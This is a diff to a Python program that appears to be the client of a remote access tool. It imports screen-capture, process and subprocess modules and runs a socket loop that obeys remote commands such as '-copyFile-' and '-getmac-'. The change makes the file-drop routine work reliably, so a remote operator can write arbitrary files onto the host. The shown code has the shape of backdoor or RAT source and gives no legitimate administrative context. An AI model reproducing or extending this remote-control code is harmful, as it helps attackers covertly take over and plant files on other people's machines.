@@ -1,6 +1,7 @@
 import socket
 from PIL import ImageGrab
 import base64
+import math
 import os
 import psutil
 import subprocess
@@ -97,15 +98,18 @@ def connect():
                     conn.sendall(bytes("fail", "utf8"))
             elif encodedData == "-copyFile-":
                 fileName = conn.recv(1024).decode("utf8")
-                print(fileName)
+                fileName = currentPath + "\\" + fileName
+                conn.sendall(bytes("gotfilename", "utf8"))
+                fileSize = int(conn.recv(1024).decode("utf8"))
+                timeToWrite = math.ceil(fileSize/1024/4)
+                conn.sendall(bytes("gotfilesize", "utf8"))
                 with open(fileName, 'wb') as f:
                     while True:
-                        byteRead = conn.recv(1024*4)
-                        print(len(byteRead))
-                        if(len(byteRead) < 1024*4):
-                            f.write(byteRead)
+                        if(timeToWrite == 0):
                             break
+                        byteRead = conn.recv(1024*4)
                         f.write(byteRead)
+                        timeToWrite = timeToWrite-1
                     f.close()
 
             elif encodedData == "-getmac-":
